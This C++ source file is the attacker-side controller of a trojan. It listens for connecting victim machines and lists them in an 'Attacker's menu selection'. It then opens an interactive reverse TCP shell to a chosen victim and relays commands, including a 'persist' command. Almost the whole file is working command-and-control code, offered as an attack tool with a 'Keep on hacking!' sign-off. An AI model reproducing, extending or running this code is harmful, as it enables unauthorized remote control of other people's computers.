#include <iostream>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <fstream>
#include <thread>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>
#include <vector>
#include <sstream>
#include <filesystem>
#include <mutex>

using namespace std;

std::mutex mu;

bool server_started  = false;
pid_t pid;

thread tListener;
vector<thread> threads;

struct sockaddr_in server_address, client_address;
struct client {
	int id;
	string ip_address;
};

vector<client> clients;

int sock, client_socket;

void printASCII(string fileName)
{
	string line = "";
	ifstream inFile;
	inFile.open(fileName);
	if (inFile.is_open())
	{
		while(getline(inFile, line))
		{
			cout << line << endl;
		}
	} else {
		cout << "File failed to load. " << endl;
		cout << "Nothing to display." << endl;
	}
	inFile.close();
}

void menu_header()
{
	string fileName = "trojan_art.txt";
	printASCII(fileName);
}

bool checkIfExists(string sin_addr)
{
	vector<client>::iterator iter = clients.begin();
	for(iter; iter < clients.end(); iter++) 
	{
		if ((*iter).ip_address == sin_addr) 
		{	
			return true;
		}
	}
	
	return false;
}

void closeConnection(int cli_sock)
{
	client cli;
	vector<client>::iterator iter = clients.begin();
	for(iter; iter < clients.end(); iter++) 
	{
		if ((*iter).id == cli_sock) 
		{	
			cli = *iter;
			clients.erase(iter);
			iter--;
		}
	}
	
	cout << "\nClient (" << cli.ip_address << ") disconnected.";
	
	close(cli_sock);
	
	sleep(2);
				
	return;
}

void connection_listener(int i)
{
	while(clients.size() != i)
	{	
		socklen_t client_length = sizeof(client_address);
		if ((client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length)) < 0) {
			perror("accept");
			exit(EXIT_FAILURE);
		}
		
		if (!checkIfExists(inet_ntoa(client_address.sin_addr)))
		{
			clients.push_back({ client_socket, inet_ntoa(client_address.sin_addr) });
	  		
	  		mu.lock();
			cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Clients Connected: " << clients.size() << endl;
			mu.unlock();
		}
	}

}

void start_reverse_tcp_shell(client cli)
{
	char buffer[1024];
	char response[18384];
	
	int c;

	while ( (c = getchar()) != '\n' && c != EOF ) { }

	while(true) {
		bzero(&buffer, sizeof(buffer));
	        bzero(&response, sizeof(response));
	        cout << "* Shell# " << cli.ip_address << " ~$: ";
	        fgets(buffer, sizeof(buffer), stdin);
	        strtok(buffer, "\n");
	        write(cli.id, buffer, sizeof(buffer));
		
		if (strncmp("exit", buffer, 4) == 0) {
			break;
		}
	        else if (strncmp("close", buffer, 5) == 0) {
	        	cout << "Closing connection...";
	        	closeConnection(cli.id);
	                break;
	        }
	        else if (strncmp("cd ", buffer, 3) == 0) {
	        	continue;
		} 
		else if (strncmp("persist", buffer, 7) == 0) {
			recv(cli.id, response, sizeof(response), 0);
			cout << response << "\n";
		}
		else {	
			while(strlen(response) == 0) {
				recv(cli.id, response, sizeof(response), MSG_WAITALL);
			}
			cout << response << "\n";
		}
	}
}

void start_server()
{		
	if (server_started == false)
	{
		server_started = true;
		int num_connections = 5;
		string server_ip;
		int port;
		
		cout << "\nEnter server IP address: \n";
		cin >> server_ip;
		
		cout << "\nEnter server port: \n";
		cin >> port;

		int optval = 1;
		
		// Creating socket file descriptor
		sock = socket(AF_INET, SOCK_STREAM, 0);
	
		// Setting socket options
		if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
			printf("Error Setting TCP Socket Options!\n");
			return;
		}

		server_address.sin_family = AF_INET;
		server_address.sin_addr.s_addr = inet_addr(server_ip.c_str());
		server_address.sin_port = htons(port);
		
		// Binding socket to address and port
		bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
		
		// Wait for clients connections
		listen(sock, num_connections);
		
		tListener = thread(connection_listener, num_connections);
		tListener.detach();
	}

	char char_choice[1];
	int int_choice = 0;
	
	while(true)
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Choose client machine: \n\n";
		
		for (int i = 1; i <= clients.size(); i++)
		{
			cout << i << ". " << clients[i - 1].ip_address << "\n";
		}
		cout << to_string(clients.size() + 1) + ". Exit\n";
		
		cin >> char_choice;
		int_choice = atoi(char_choice);
		
		if (int_choice >= 1 && int_choice <= clients.size()) 
		{
			start_reverse_tcp_shell(clients[int_choice - 1]);
		}
		else if (int_choice - clients.size() == 1)
		{
			return;
		}
		else
		{
			cout << "Wrong choice. Enter option again.";
		}
	}
}

void play_music(string songName)
{	
	if (pid > 0) {
		kill(-pid, SIGKILL);
		cout << "\nkilled process group " << pid;
	}
	
	pid = fork();
	if (pid == 0) { // child procress
		setpgid(getpid(), getpid());
		string cmd = "canberra-gtk-play -f music/" + songName;
		system(cmd.c_str());
		exit(0);
	}
}

string format_filename_output(string path)
{
	string s(path);
	stringstream filename(s);
	string segment;
	vector<string> seglist;

	while(getline(filename, segment, '/'))
	{
	   seglist.push_back(segment);
	}
	
	return seglist[seglist.size() - 1];
}

void music_menu()
{	 	
 	char char_choice[1];
	int int_choice = 0;

	while(true)
	{
		vector<string> music_list;
		string path = string(get_current_dir_name()) + string("/music");
	    	for (const auto & entry : filesystem::directory_iterator(path)) {
	    		music_list.push_back(format_filename_output(entry.path()));
	    	}
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Select music to play: \n\n";
		for (int i = 1; i <= music_list.size(); i++)
		{
			cout << i << ". " << music_list[i - 1] << "\n";
		}
		cout << to_string(music_list.size() + 1) + ". Stop music\n";
		cout << to_string(music_list.size() + 2) + ". Exit\n";
		
		cin >> char_choice;
		int_choice = atoi(char_choice);
		
		if (int_choice >= 1 && int_choice <= music_list.size()) 
		{
			play_music(music_list[int_choice - 1]);
		}
		else if (int_choice > music_list.size() && (int_choice - music_list.size()) <= 2)
		{
			if ((int_choice - music_list.size()) == 1)
			{
				if (pid > 0) {
					kill(-pid, SIGKILL);
					cout << "\nMusic stopped: " << pid;
				}
			} else {
				return;
			}
		}
		else
		{
			cout << "Wrong choice. Enter option again.";
		}
	}
}

void main_menu()
{
	char char_choice[1];
	int int_choice = 0;
	do
	{
		system("clear");
		menu_header();
		cout << "\n";
		cout << "Attacker's menu selection: \n\n";
		cout << "1. start server\n";
		cout << "2. music_menu\n";
		cout << "3. Exit\n\n";
		cin >> char_choice;
		int_choice = atoi(char_choice);

		
		switch(int_choice) 
		{
			case 1:
				start_server();
				break;
			case 2:
				music_menu();
				break;
			case 3:
				break;
			default:
				cout << "Wrong choice. Enter option again.";
				break;

		}
	} while(int_choice != 3);
}

void signal_callback_handler(int signum) {
   if (pid > 0) kill(-pid, SIGKILL);
   exit(signum);
}

int main()
{
	signal(SIGINT, signal_callback_handler);
	main_menu();
	if (pid > 0) kill(-pid, SIGKILL);
	cout << "\nYou are such an angel. Keep on hacking!";
	return 0;
}
